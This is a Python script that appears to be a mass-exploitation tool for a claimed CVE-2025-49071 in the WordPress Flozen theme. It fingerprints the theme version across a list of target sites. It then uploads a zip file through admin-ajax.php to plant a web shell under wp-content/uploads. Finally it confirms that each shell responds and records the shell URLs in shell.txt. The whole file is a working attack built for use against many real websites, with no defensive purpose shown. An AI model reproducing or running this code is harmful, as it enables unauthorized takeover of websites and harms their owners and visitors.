#!/usr/bin/env python3
"""SHADOW-HERE"""

import requests
import threading
import queue
import ssl
import urllib3
import sys
import re
import os
import time
from colorama import Fore, Style, init

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context
init(autoreset=True)

class FlozenExploitTool:
    def __init__(self, threads=10):
        self.threads = threads
        self.target_queue = queue.Queue()
        self.exploited = 0
        self.scanned = 0
        self.lock = threading.Lock()
        
        self.shell_path = "/wp-content/uploads/nasa-custom-fonts/shadow/index.php"
        self.shell_check_string = "<button>-Shadow-Here-</button>"
        self.zip_name = "shadow.zip"

    def check_zip_exists(self):
        if not os.path.exists(self.zip_name):
            print(f"{Fore.RED}[!] ERROR: {self.zip_name} tidak ditemukan!")
            return False
        return True

    def extract_version(self, css_content):
        """Extract version from CSS"""
        try:
            match = re.search(r"Version:\s*([0-9.]+)", css_content, re.IGNORECASE)
            if match:
                return match.group(1).strip()
            return None
        except:
            return None

    def check_version_vuln(self, version):
        try:
            version_parts = list(map(int, version.split('.')))
            vulnerable = (version_parts[0] < 1 or 
                         (version_parts[0] == 1 and version_parts[1] < 5) or
                         (version_parts[0] == 1 and version_parts[1] == 5 and version_parts[2] < 1))
            return vulnerable
        except:
            return False

    def get_url_variations(self, url):
        """Generate semua kemungkinan URL variations"""
        variations = []
        
        url = url.strip()
        
        if url.startswith('http://') or url.startswith('https://'):
            if url.startswith('http://'):
                variations.append(url)
                variations.append(url.replace('http://', 'https://', 1))
            else:
                variations.append(url)
                variations.append(url.replace('https://', 'http://', 1))
            
            if '://www.' in url:
                variations.append(url.replace('://www.', '://', 1))
            else:
                variations.append(url.replace('://', '://www.', 1))
        else:
            domain = url.strip('/')
            variations = [
                f"https://{domain}",
                f"http://{domain}",
                f"https://www.{domain}",
                f"http://www.{domain}"
            ]
        
        return list(dict.fromkeys(variations))

    def check_theme_exists(self, url):
        """Coba semua URL variations untuk cari theme"""
        url_variations = self.get_url_variations(url)
        
        for base_url in url_variations:
            css_url = base_url.rstrip('/') + "/wp-content/themes/flozen-theme/style.css"
            
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/css,*/*;q=0.1"
                }
                
                response = requests.get(
                    css_url, 
                    headers=headers,
                    verify=False, 
                    timeout=10,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    content = response.text
                    
                    if 'Theme Name:' in content or 'flozen' in content.lower():
                        version = self.extract_version(content)
                        if version:
                            return version, base_url
                        else:
                            return "unknown", base_url
            
            except:
                continue
        
        return None, None

    def exploit_site(self, url):
        try:
            version, working_url = self.check_theme_exists(url)
            
            if not version:
                print(f"{Fore.YELLOW}[!] Gak Ada Bro Themes nya!: {url}")
                return False
            
            if not working_url:
                working_url = url
            
            if version == "unknown":
                print(f"{Fore.YELLOW}[!] Theme found but version unknown: {working_url}")
                print(f"{Fore.GREEN}[+] Gas Exploit Cuk! {working_url} 🚩💉")
            elif not self.check_version_vuln(version):
                print(f"{Fore.RED}[-] Gak Rentan Cuk!: {working_url} | Version: {version}")
                return False
            else:
                print(f"{Fore.GREEN}[+] Gas Exploit Cuk! {working_url} | Version: {version} 🚩💉")
            
            exploit_url = working_url.rstrip('/') + "/wp-admin/admin-ajax.php"
            
            with open(self.zip_name, 'rb') as f:
                zip_data = f.read()
            
            files = {
                'zip_packet_font': (self.zip_name, zip_data, 'application/zip')
            }
            data = {
                'action': 'wp_handle_upload'
            }
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*"
            }
            
            try:
                response = requests.post(
                    exploit_url,
                    files=files,
                    data=data,
                    headers=headers,
                    verify=False,
                    timeout=30
                )
                print(f"{Fore.CYAN}[*] Exploit sent...")
            except requests.exceptions.ConnectionError:
                print(f"{Fore.RED}[-] Connection failed: {working_url}")
                return False
            except:
                print(f"{Fore.RED}[-] Failed to send exploit: {working_url}")
                return False
            
            time.sleep(3)
            
            shell_found, status_code = self.check_shell(working_url)
            
            if shell_found:
                with self.lock:
                    self.exploited += 1
                return True
            else:
                print(f"{Fore.RED}[-] Shell not found: {working_url} | Status: {status_code}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error for {url}: {str(e)}")
            return False

    def check_shell(self, url):
        try:
            url_variations = self.get_url_variations(url)
            last_status = "N/A"
            
            for base_url in url_variations:
                shell_url = base_url.rstrip('/') + self.shell_path
                
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    }
                    
                    response = requests.get(
                        shell_url, 
                        headers=headers,
                        verify=False, 
                        timeout=10
                    )
                    
                    last_status = response.status_code
                    
                    if response.status_code == 200 and self.shell_check_string in response.text:
                        print(f"{Fore.GREEN}[+] Shell Ada Bro! {shell_url}")
                        
                        with open("shell.txt", "a") as f:
                            f.write(f"{shell_url}\n")
                        return True, last_status
                        
                except requests.exceptions.ConnectionError:
                    last_status = "Connection Error"
                    continue
                except:
                    last_status = "Error"
                    continue
            
            return False, last_status
            
        except:
            return False, "Check Error"

    def process_site(self):
        while True:
            try:
                site = self.target_queue.get(timeout=2)
                site = site.strip()
                
                if not site:
                    self.target_queue.task_done()
                    continue
                
                self.exploit_site(site)
                self.target_queue.task_done()
                
            except queue.Empty:
                break
            except:
                self.target_queue.task_done()

    def load_targets(self, filename):
        try:
            with open(filename, 'r') as f:
                sites = [line.strip() for line in f if line.strip()]
            return sites
        except:
            print(f"{Fore.RED}[!] Error loading file")
            sys.exit(1)

    def banner(self):
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════╗
║    CVE-2025-49071 - Flozen Theme Exploit Tool v2.0      ║
║                 Author: Friska @ Shadow                 ║
╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)

    def run(self):
        self.banner()
        
        if not self.check_zip_exists():
            return
        
        try:
            filename = input(f"{Fore.YELLOW}[?] Enter filename with targets: {Style.RESET_ALL}").strip()
            
            while True:
                try:
                    threads = int(input(f"{Fore.YELLOW}[?] Enter threads (5-50): {Style.RESET_ALL}").strip())
                    if 5 <= threads <= 50:
                        break
                    print(f"{Fore.RED}[!] Threads must be between 5-50")
                except:
                    print(f"{Fore.RED}[!] Enter a valid number")
            
            self.threads = threads
            
            print(f"{Fore.CYAN}[*] Loading targets...")
            sites = self.load_targets(filename)
            total = len(sites)
            print(f"{Fore.GREEN}[+] Loaded {total} targets")
            
            if os.path.exists("shell.txt"):
                os.remove("shell.txt")
            
            for site in sites:
                self.target_queue.put(site)
            
            print(f"{Fore.CYAN}[*] Starting {self.threads} threads...")
            workers = []
            for i in range(min(self.threads, total)):
                t = threading.Thread(target=self.process_site)
                t.daemon = True
                t.start()
                workers.append(t)
            
            self.target_queue.join()
            
            print(f"\n{Fore.CYAN}{'='*60}")
            print(f"{Fore.GREEN}[+] COMPLETE!")
            print(f"{Fore.GREEN}[*] Shells uploaded: {self.exploited}")
            
            if os.path.exists("shell.txt"):
                print(f"{Fore.GREEN}[*] Shells saved in: shell.txt")
            
            print(f"{Fore.CYAN}{'='*60}")
            
            if self.exploited > 0:
                print(f"\n{Fore.RED}🚩💉 {self.exploited} SHELLS READY!")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Interrupted")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {str(e)}")
            sys.exit(1)

if __name__ == "__main__":
    tool = FlozenExploitTool()
    tool.run()